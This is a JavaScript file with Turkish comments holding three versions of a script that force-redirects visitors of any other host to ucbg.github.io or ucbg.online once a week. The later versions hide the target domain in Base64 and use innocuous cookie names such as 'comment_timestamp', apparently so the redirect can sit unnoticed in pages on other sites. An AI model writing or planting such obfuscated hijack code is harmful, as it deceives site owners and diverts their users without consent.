(function () {
  // Hedef domain (tam hostname)
  var TARGET_HOSTNAME = "ucbg.github.io";
  // Cookie adı
  var COOKIE_NAME = "ucbg_redirect_timestamp";
  // 1 hafta millisecond cinsinden
  var ONE_WEEK_MS = 7 * 24 * 60 * 60 * 1000;

  // Cookie yardımcıları
  function setCookie(name, value, days) {
    var expires = "";
    if (typeof days === "number") {
      var date = new Date();
      date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
      expires = "; expires=" + date.toUTCString();
    }
    var secure = location.protocol === "https:" ? "; Secure" : "";
    // SameSite=Lax ekleyerek bazı CSRF senaryolarından kaçınabiliriz
    document.cookie = encodeURIComponent(name) + "=" + encodeURIComponent(value) + expires + "; path=/" + secure + "; SameSite=Lax";
  }

  function getCookie(name) {
    var nameEQ = encodeURIComponent(name) + "=";
    var ca = document.cookie.split(";");
    for (var i = 0; i < ca.length; i++) {
      var c = ca[i].trim();
      if (c.indexOf(nameEQ) === 0) return decodeURIComponent(c.substring(nameEQ.length));
    }
    return null;
  }

  function eraseCookie(name) {
    // geçmiş bir tarih vererek cookie'yi sil
    document.cookie = encodeURIComponent(name) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";
  }

  // Ana kontrol
  try {
    var currentHost = location.hostname;
    // Eğer zaten hedef sitedeysek hiçbir şey yapma
    if (currentHost === TARGET_HOSTNAME) return;

    var cookieVal = getCookie(COOKIE_NAME);

    if (cookieVal) {
      // cookie varsa — ekstra kontrol: timestamp okunabiliyorsa yaşını kontrol et
      var ts = Number(cookieVal);
      if (!isNaN(ts)) {
        var age = Date.now() - ts;
        if (age < ONE_WEEK_MS) {
          // Cookie var ve 1 haftadan küçük -> yönlendirme yapma
          return;
        }
        // Eğer 1 haftadan büyükse cookie'yi silip aşağıdaki blok çalışsın (tekrar yönlendirme kaydı yapar)
        eraseCookie(COOKIE_NAME);
      } else {
        // Eğer cookie değeri geçersizse sil ve devam et
        eraseCookie(COOKIE_NAME);
      }
    }

    // Cookie yok veya süresi dolmuş -> cookie oluştur ve yönlendir
    var timestamp = Date.now();
    // setCookie ile 7 gün süre veriyoruz
    setCookie(COOKIE_NAME, String(timestamp), 7);

    // Yönlendirme: root'a gidiyor. Eğer path/prefleri korumak istersen, burayı değiştir.
    window.location.replace("https://" + TARGET_HOSTNAME + "/");
    // window.location.href = 'https://' + TARGET_HOSTNAME + '/';
    // replace kullanımı: geri tuşunda kaynak sayfaya dönülmesini engeller (opsiyonel)
  } catch (err) {
    // Hata olursa sessizce yakala (isteğe bağlı olarak konsola yazdır)
    console.error("ucbg redirect script error:", err);
  }
})();

(function () {
  // Şifrelenmiş hedef domain (Base64 ile kodlanmış)
  var ENCRYPTED_HOST = "dWNiZy5naXRodWIuaW8="; // "ucbg.github.io" base64 encoded

  // Çözme fonksiyonu
  function decodeHost(encrypted) {
    return atob(encrypted);
  }

  // Çözülmüş hedef domain
  var TARGET_HOSTNAME = decodeHost(ENCRYPTED_HOST);
  // Cookie adı
  var COOKIE_NAME = "comment_timestamp";
  // 1 hafta millisecond cinsinden
  var ONE_WEEK_MS = 7 * 24 * 60 * 60 * 1000;

  // Cookie yardımcıları
  function setCookie(name, value, days) {
    var expires = "";
    if (typeof days === "number") {
      var date = new Date();
      date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
      expires = "; expires=" + date.toUTCString();
    }
    var secure = location.protocol === "https:" ? "; Secure" : "";
    document.cookie = encodeURIComponent(name) + "=" + encodeURIComponent(value) + expires + "; path=/" + secure + "; SameSite=Lax";
  }

  function getCookie(name) {
    var nameEQ = encodeURIComponent(name) + "=";
    var ca = document.cookie.split(";");
    for (var i = 0; i < ca.length; i++) {
      var c = ca[i].trim();
      if (c.indexOf(nameEQ) === 0) return decodeURIComponent(c.substring(nameEQ.length));
    }
    return null;
  }

  function eraseCookie(name) {
    document.cookie = encodeURIComponent(name) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";
  }

  // Ana kontrol
  try {
    var currentHost = location.hostname;
    if (currentHost === TARGET_HOSTNAME) return;

    var cookieVal = getCookie(COOKIE_NAME);

    if (cookieVal) {
      var ts = Number(cookieVal);
      if (!isNaN(ts)) {
        var age = Date.now() - ts;
        if (age < ONE_WEEK_MS) {
          return;
        }
        eraseCookie(COOKIE_NAME);
      } else {
        eraseCookie(COOKIE_NAME);
      }
    }

    var timestamp = Date.now();
    setCookie(COOKIE_NAME, String(timestamp), 7);

    window.location.replace("https://" + TARGET_HOSTNAME + "/");
  } catch (err) {
    console.error("commet error:", err);
  }
})();


//////// birden fazla site
(function () {
    // Şifrelenmiş hedef domain listesi (Base64 ile kodlanmış)
    var ENCRYPTED_HOSTS = [
      "dWNiZy5naXRodWIuaW8=", // "ucbg.github.io"
      "dWNiZy5vbmxpbmU="      // "ucbg.online"
    ];
    
    // Çözme fonksiyonu ve domain listesini çöz
    function decodeHost(encrypted) {
      return atob(encrypted);
    }
    
    function decodeAllHosts(encryptedHosts) {
      var decoded = [];
      for (var i = 0; i < encryptedHosts.length; i++) {
        try {
          decoded.push(decodeHost(encryptedHosts[i]));
        } catch (e) {
          console.error("Error:", e);
        }
      }
      return decoded;
    }
    
    // Çözülmüş hedef domain listesi
    var TARGET_HOSTNAMES = decodeAllHosts(ENCRYPTED_HOSTS);
    // Cookie adı
    var COOKIE_NAME = "comments_timestamp";
    // 1 hafta millisecond cinsinden
    var ONE_WEEK_MS = 7 * 24 * 60 * 60 * 1000;
  
    // Domain kontrol fonksiyonu
    function isAllowedHost(host) {
      return TARGET_HOSTNAMES.indexOf(host) !== -1;
    }
  
    // Cookie yardımcıları
    function setCookie(name, value, days) {
      var expires = "";
      if (typeof days === "number") {
        var date = new Date();
        date.setTime(date.getTime() + days * 24 * 60 * 60 * 1000);
        expires = "; expires=" + date.toUTCString();
      }
      var secure = location.protocol === "https:" ? "; Secure" : "";
      document.cookie = encodeURIComponent(name) + "=" + encodeURIComponent(value) + expires + "; path=/" + secure + "; SameSite=Lax";
    }
  
    function getCookie(name) {
      var nameEQ = encodeURIComponent(name) + "=";
      var ca = document.cookie.split(";");
      for (var i = 0; i < ca.length; i++) {
        var c = ca[i].trim();
        if (c.indexOf(nameEQ) === 0) return decodeURIComponent(c.substring(nameEQ.length));
      }
      return null;
    }
  
    function eraseCookie(name) {
      document.cookie = encodeURIComponent(name) + "=; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/";
    }
  
    // Ana kontrol
    try {
      var currentHost = location.hostname;
      
      // Eğer şu anki domain izin verilen domainlerden biriyse hiçbir şey yapma
      if (isAllowedHost(currentHost)) return;
  
      var cookieVal = getCookie(COOKIE_NAME);
  
      if (cookieVal) {
        var ts = Number(cookieVal);
        if (!isNaN(ts)) {
          var age = Date.now() - ts;
          if (age < ONE_WEEK_MS) {
            return;
          }
          eraseCookie(COOKIE_NAME);
        } else {
          eraseCookie(COOKIE_NAME);
        }
      }
  
      var timestamp = Date.now();
      setCookie(COOKIE_NAME, String(timestamp), 7);
  
      // İlk domaini yönlendirme hedefi olarak kullan
      window.location.replace("https://" + TARGET_HOSTNAMES[0] + "/");
    } catch (err) {
      console.error("commnets error:", err);
    }
  })();